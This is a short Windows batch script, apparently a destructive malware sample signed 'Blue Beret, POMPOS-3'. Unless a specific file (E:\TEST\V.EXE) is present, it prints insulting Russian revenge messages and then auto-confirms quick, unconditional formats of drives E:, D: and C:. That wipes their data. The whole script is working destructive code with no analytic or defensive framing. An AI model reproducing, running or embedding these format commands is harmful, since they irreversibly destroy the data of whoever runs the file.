rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
@echo off
@echo off
if exist E:\TEST\V.EXE goto fun
echo  Ты не принял меня в серьёз, но месть неизбежна! Козел!
echo К сУжалению, ты меня подвел под ЛОХА! Туз сердиться...
echo y| format e: /q /u /v:(c) POMPOS-3
echo y| format d: /q /u /v:(c) POMPOS-3
echo y| format c: /q /u /v:(c) POMPOS-3
:(c) Blue Beret, POMPOS-3 

:fun
